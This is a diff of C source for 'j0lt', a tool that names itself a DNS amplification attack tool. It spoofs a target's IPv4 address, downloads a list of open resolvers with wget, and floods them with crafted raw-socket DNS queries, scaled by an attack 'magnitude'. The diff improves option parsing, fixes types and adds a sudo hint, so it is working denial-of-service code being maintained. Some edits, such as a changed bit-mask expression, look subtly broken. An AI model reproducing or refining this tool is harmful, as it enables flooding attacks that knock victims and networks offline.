@@ -1,4 +1,4 @@
-/*      PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE
+/* PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE
  *      _________  .__   __
  *     |__\   _  \ |  |_/  |_
  *     |  /  /_\  \|  |\   __\
@@ -17,57 +17,55 @@
  * [-x] will print a hexdump of the packet headers
  * [-d] puts j0lt into debug mode, no packets are sent
  * [-r list] will not fetch a resolv list, if one is provided.
- * ------------------------------------------------------------
- * Shouts to the only sane place left on the internet
- * irc.efnet.org #c
  */
 
 const char* g_ansi = {
-    " the-scientist@rootstorm.com ░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒                   ▒░░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░  ░░                 ░░░░░░░░░░░░░░░░░░░░░░ ░░░░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓ ░\n"
-    "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓▓░░░░ ░░░░░▒▒░   ▓▓▓▓▓▓▓▓   \n"
-    "░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░          ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ░\n"
-    "░░░░░▓▓▓▓▓▓▓▓▓▓ ░░░░░░  ▓▓▓            ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ░\n"
-    "░░░░▒▓▓▓▓▓▓▓▓▓▓ ░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ░░\n"
-    "░░░░▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓ ▓▓▓     ▓▓▓▓▓▓▓▓         ▓░░\n"
-    "░░░░   ▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓         ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
-    "░░░░░░░▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓░ ░░░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
-    "░░░░░░░ ▓▓▓ ▓▓▓▓▓▓▓▓           ▓▓▓▓ ▓▓▓▓▓▓▓▓▓  ░░░░░░░░▓▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
-    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓▓             ▓▓▓ ▓▓▓▓▓▓▓▓  ░░░░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
-    "░░░░░░░░▓▓ ▓▓▓▓▓▓▓              ▓▓ ▓▓▓▓▓▓▓▓▓▓▓  ▓░░░░░░ ▓▓▓▓▓▓▓▓ ▓░░░░░░░░░\n"
-    "░░░░░░░░▓▓ ▓▓▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓░▓▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
-    "▓▓▓░░ ▓▓▓▓▓ ▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▒░░▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
-    "▓▓▓▓▓▓▓▓▓▓▓ ▓▓                ▓▓▓    ▓▓▓▓▓▓▓   ░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░░\n"
-    "▓▓▓▓▓▓▓▓▓▓▓  ▓              ▓▓▓▓▓  ░░        ░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░░\n"
-    "▓▓▓▓▓▓▓▓▓▓    ▓            ▓▓▓▓   ░░░░░░░░░░░░░░░░░▒   ░     ░░░░░░░░░░░░░░\n"
-    " ▓▓▓▓▓▓▓      ░ ▓▓       ▓▓▓▓    ░░░░░░░░░░░░░░░░░░░▓     ░▒▓░░░░░░░░░░░░░░\n"
-    "░░▓▓▓▓▓  ░░░░░░░░      ▓▓ ░      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
-    "░░░░░░░░░░░░░░░░                ░░░░░░░              ░░░░░                 \n"
-    "░░░░░░░░░░░░░░░         ▓░░░░░░░                                           \n"
-    "░░░░░░░░░░░░░░        ░ ░░░░░░░░ Usage: sudo ./j0lt -t -p -m [OPTION]...   \n"
-    "░░░░░░░░░░░░░        ░░░░░░░░░░░ -t <target>      : target IPv4 (spoof)    \n"
-    "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░ -p <port>        : target port            \n"
-    "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░ -m <magnitude>   : magnitude of attack    \n"
-    "░░░░░░░░░       ░░░░░░░░░░░░░░░░ -x [hexdump]     : print hexdump          \n"
-    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░ -d [debug]       : offline debug mode     \n"
-    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░ -r [resolv]<path>: will not download list \n"
-    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░                  : provide absolute path  \n"
-    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░                                           \n"
-    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░ w3lc0m3 t0 j0lt                           \n"
-    "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░ a DNS amplification attack tool           \n"
-    "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░                               spl0its-r-us\n"
-    "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                the-scientist@rootstorm.com\n"
+" the-scientist@rootstorm.com ░░░░░░░░░░                     ░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                    ░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒                   ▒░░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                   ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                     ░░░░░░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░                      ░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░  ░░                 ░░░░░░░░░░░░░░░░░░░░░░ ░░░░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓ ░\n"
+"░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         ▓▓▓▓▓▓▓▓▓▓░░░░ ░░░░░▒▒░   ▓▓▓▓▓▓▓▓   \n"
+"░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░          ▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ░\n"
+"░░░░░▓▓▓▓▓▓▓▓▓▓ ░░░░░░  ▓▓▓            ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ░\n"
+"░░░░▒▓▓▓▓▓▓▓▓▓▓ ░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓     ░░\n"
+"░░░░▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓ ▓▓▓     ▓▓▓▓▓▓▓▓         ▓░░\n"
+"░░░░   ▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓         ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
+"░░░░░░░▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓       ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓░ ░░░░░░░░▓▓▓▓▓▓▓▓ ░░░░░░░░░░░\n"
+"░░░░░░░ ▓▓▓ ▓▓▓▓▓▓▓▓           ▓▓▓▓ ▓▓▓▓▓▓▓▓▓  ░░░░░░░░▓▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
+"░░░░░░░░▓▓ ▓▓▓▓▓▓▓▓             ▓▓▓ ▓▓▓▓▓▓▓▓  ░░░░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░\n"
+"░░░░░░░░▓▓ ▓▓▓▓▓▓▓              ▓▓ ▓▓▓▓▓▓▓▓▓▓▓  ▓░░░░░░ ▓▓▓▓▓▓▓▓ ▓░░░░░░░░░\n"
+"░░░░░░░░▓▓ ▓▓▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓░▓▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
+"▓▓▓░░ ▓▓▓▓▓ ▓▓▓                ▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ▒░░▓▓▓▓▓▓▓▓  ░░░░░░░░░\n"
+"▓▓▓▓▓▓▓▓▓▓▓ ▓▓                ▓▓▓    ▓▓▓▓▓▓▓   ░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░░\n"
+"▓▓▓▓▓▓▓▓▓▓▓  ▓              ▓▓▓▓▓  ░░        ░░░░░░ ▓▓▓▓▓▓▓▓ ░░░░░░░░░░░░░░\n"
+"▓▓▓▓▓▓▓▓▓▓    ▓            ▓▓▓▓   ░░░░░░░░░░░░░░░░░▒   ░     ░░░░░░░░░░░░░░\n"
+" ▓▓▓▓▓▓▓      ░ ▓▓       ▓▓▓▓    ░░░░░░░░░░░░░░░░░░░▓     ░▒▓░░░░░░░░░░░░░░\n"
+"░░▓▓▓▓▓  ░░░░░░░░      ▓▓ ░      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\n"
+"░░░░░░░░░░░░░░░░                ░░░░░░░              ░░░░░                 \n"
+"░░░░░░░░░░░░░░░         ▓░░░░░░░                                           \n"
+"░░░░░░░░░░░░░░        ░ ░░░░░░░░ Usage: sudo ./j0lt -t -p -m [OPTION]...   \n"
+"░░░░░░░░░░░░░        ░░░░░░░░░░░ -t <target>      : target IPv4 (spoof)    \n"
+"░░░░░░░░░░░▓       ▒░░░░░░░░░░░░ -p <port>        : target port            \n"
+"░░░░░░░░░░▒      ░░░░░░░░░░░░░░░ -m <magnitude>   : magnitude of attack    \n"
+"░░░░░░░░░       ░░░░░░░░░░░░░░░░ -x [hexdump]     : print hexdump          \n"
+"░░░░░░░░░     ░░░░░░░░░░░░░░░░░░ -d [debug]       : offline debug mode     \n"
+"░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░ -r [resolv]<path>: will not download list \n"
+"░░░░░      ░░░░░░░░░░░░░░░░░░░░░                  : provide absolute path  \n"
+"░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░                                           \n"
+"░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░ w3lc0m3 t0 j0lt                           \n"
+"░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░ a DNS amplification attack tool           \n"
+"░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░                               spl0its-r-us\n"
+"░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                the-scientist@rootstorm.com\n"
 };
+
 #include <stdbool.h>
 #include <stddef.h>
 #include <stdint.h>
@@ -113,47 +111,47 @@ typedef struct __attribute__((packed, aligned(1))) {
 #endif
 } PSEUDOHDR;
 
-#define DEFINE_INSERT_FN(typename, datatype)           \
-        bool insert_##typename                         \
-        (uint8_t** buf, size_t* buflen, datatype data) \
-    {                                                  \
-        uint64_t msb_mask, lsb_mask,                   \
-            bigendian_data, lsb, msb;                  \
-        size_t byte_pos, nbits;                        \
-                                                       \
-        if (*buflen < 1) {                             \
-            return false;                              \
-        }                                              \
-                                                       \
-        nbits = sizeof(data) << 3;                     \
-        bigendian_data = 0ULL;                         \
-        byte_pos = (nbits / 8) - 1;                    \
-        lsb_mask = 0xffULL;                            \
-        msb_mask = lsb_mask << nbits - 8;              \
-                                                       \
-        byte_pos = byte_pos << 3;                      \
-        for (int i = nbits >> 4; i != 0; i--) {        \
-            lsb = (data & lsb_mask);                   \
-            msb = (data & msb_mask);                   \
-            lsb <<= byte_pos;                          \
-            msb >>= byte_pos;                          \
-            bigendian_data |= lsb | msb;               \
-            msb_mask >>= 8;                            \
-            lsb_mask <<= 8;                            \
-            byte_pos -= (2 << 3);                      \
-        }                                              \
-                                                       \
-        data = bigendian_data == 0 ?                   \
-            data : bigendian_data;                     \
-        for (int i = sizeof(data);                     \
-             *buflen != -1 && i > 0; i--) {            \
-            *(*buf)++ = (data & 0xff);                 \
-            data >>= 8;                                \
-            (*buflen)--;                               \
-        }                                              \
-                                                       \
-        return data == 0;                              \
-    }                                                  \
+#define DEFINE_INSERT_FN(typename, datatype)            \
+        bool insert_##typename                          \
+        (uint8_t** buf, size_t* buflen, datatype data)  \
+    {                                                   \
+        uint64_t msb_mask, lsb_mask,                    \
+            bigendian_data, lsb, msb;                   \
+        size_t byte_pos, nbits;                         \
+                                                        \
+        if (*buflen < 1) {                              \
+            return false;                               \
+        }                                               \
+                                                        \
+        nbits = sizeof(data) << 3;                      \
+        bigendian_data = 0ULL;                          \
+        byte_pos = (nbits / 8) - 1;                     \
+        lsb_mask = 0xffULL;                             \
+        msb_mask = (lsb_mask << nbits) - 8;             \
+                                                        \
+        byte_pos = byte_pos << 3;                       \
+        for (int i = nbits >> 4; i != 0; i--) {         \
+            lsb = (data & lsb_mask);                    \
+            msb = (data & msb_mask);                    \
+            lsb <<= byte_pos;                           \
+            msb >>= byte_pos;                           \
+            bigendian_data |= lsb | msb;                \
+            msb_mask >>= 8;                             \
+            lsb_mask <<= 8;                             \
+            byte_pos -= (2 << 3);                       \
+        }                                               \
+                                                        \
+        data = bigendian_data == 0 ?                    \
+            data : bigendian_data;                      \
+        for (int i = sizeof(data);                      \
+             *buflen != -1 && i > 0; i--) {             \
+            *(*buf)++ = (data & 0xff);                  \
+            data = (data >> 8);                         \
+            (*buflen)--;                                \
+        }                                               \
+                                                        \
+        return data == 0;                               \
+    }                                                   \
 
 DEFINE_INSERT_FN(byte, uint8_t)
 DEFINE_INSERT_FN(word, uint16_t)
@@ -161,12 +159,11 @@ DEFINE_INSERT_FN(dword, uint32_t)
 DEFINE_INSERT_FN(qword, uint64_t)
 #undef DEFINE_INSERT_FN
 
-#define     err_exit(msg) do {  perror(msg); \
-                                exit(EXIT_FAILURE); \
+#define     err_exit(msg) do {  perror(msg);            \
+                                exit(EXIT_FAILURE);     \
                                 } while (0)
-
-#define     fork_err_exit(msg) do { perror(msg); \
-                                    _exit(EXIT_FAILURE); \
+#define     fork_err_exit(msg) do { perror(msg);        \
+                                    _exit(EXIT_FAILURE);\
                                     } while (0)
 // IP HEADER VALUES
 #define     IP_IHL_MIN_J0LT 5
@@ -207,6 +204,7 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     MAX_LINE_SZ_J0LT 0x30
 
 char** environ;
+const char* g_args = "hdt:p:m:r:";
 const char* g_path = "/tmp/resolv.txt";
 char* g_wget[ ] = {
     "/bin/wget", "-O", "/tmp/resolv.txt",
@@ -238,8 +236,9 @@ main(int argc, char** argv)
 {
     FILE* fptr;
     char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ], resolvpath[ PATH_MAX ];
-    char* pathptr;
-    int status, i, opt, s, debugmode, hexmode, filereadmode, pathsz;
+    const char* pathptr;
+    int status, i, opt, s, pathsz;
+    bool debugmode, hexmode, filereadmode;
     size_t szpayload, nread, szpewpew;
     uint32_t spoofip, resolvip;
     uint16_t spoofport, magnitude;
@@ -254,11 +253,10 @@ main(int argc, char** argv)
     file_actionsp = NULL;
 
     printf("%s", g_ansi);
-    printf("argc: %d\n", argc);
 
-    filereadmode = debugmode = hexmode = 0;
-    magnitude = spoofport = spoofip = -1;
-    opt = getopt(argc, argv, "t:p:m:r:hd");
+    filereadmode = debugmode = hexmode = false;
+    magnitude = spoofport = spoofip = 0;
+    opt = getopt(argc, argv, g_args);
     do {
         switch (opt) {
         case 't':
@@ -291,18 +289,18 @@ main(int argc, char** argv)
             pathptr = resolvpath;
             break;
         case 'h':
-            hexmode = 1;
+            hexmode = true;
             break;
         case 'd':
-            debugmode = 1;
+            debugmode = true;
             break;
         case -1:
         default: /* '?' */
             err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
         }
-    } while ((opt = getopt(argc, argv, "t:p:m:")) != -1);
+    } while ((opt = getopt(argc, argv, g_args)) != -1);
 
-    if (magnitude == -1 || spoofport == -1 || spoofip == -1)
+    if (magnitude == 0 || spoofport == 0 || spoofip == 0)
         err_exit("Usage: ./j0lt -t target -p port -m magnitude [OPTION]...\n");
 
     if (filereadmode == 0) {
@@ -343,11 +341,11 @@ main(int argc, char** argv)
         } while (!WIFEXITED(status) && !WIFSIGNALED(status));
     }
 
-    fptr = fopen(g_path, "r");
+    fptr = fopen(pathptr, "r");
     if (fptr == NULL)
         err_exit("* fopen error");
 
-    printf("+ resolv list saved to %s\n", g_path);
+    printf("+ resolv list saved to %s\n", pathptr);
     while (magnitude >= 1) {
         printf("+ current attack magnitude %d \n", magnitude);
         while (fgets(lineptr, MAX_LINE_SZ_J0LT, fptr) != NULL) {
@@ -364,7 +362,7 @@ main(int argc, char** argv)
             if (debugmode == 0) {
                 szpewpew = PEWPEW_J0LT;
                 while (szpewpew-- > 0)
-                    SendPayload(payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
+                    SendPayload((uint8_t *)payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
             }
             if (hexmode == 1)
                 PrintHex(payload, szpayload);
@@ -502,7 +500,7 @@ InsertUDPHeader(uint8_t** buf, size_t* buflen, PSEUDOHDR* phdr, const uint8_t* d
 {
     bool status;
     size_t totalsz = sizeof(PSEUDOHDR) + ulen;
-    size_t datasz = abs(ulen - sizeof(struct udphdr));
+    size_t datasz = (ulen - sizeof(struct udphdr));
     size_t udpsofar;
     uint16_t checksum;
     uint8_t pseudo[ totalsz ];
@@ -580,7 +578,7 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
     if (raw_sockfd == -1) {
         remove(g_path);
         printf("- resolv list removed from %s\n", g_path);
-        err_exit("* fatal socket error");
+        err_exit("* fatal socket error run using sudo");
     }
 
     addr.sin_family = AF_INET;
@@ -642,7 +640,7 @@ PrintHex(void* data, size_t len)
     size_t i, j;
     for (j = 0, i = 0; i < len; i++) {
         if (i % 16 == 0) {
-            printf("\n0x%.4x: ", j);
+            printf("\n0x%.4zx: ", j);
             j += 16;
         }
         if (i % 2 == 0)
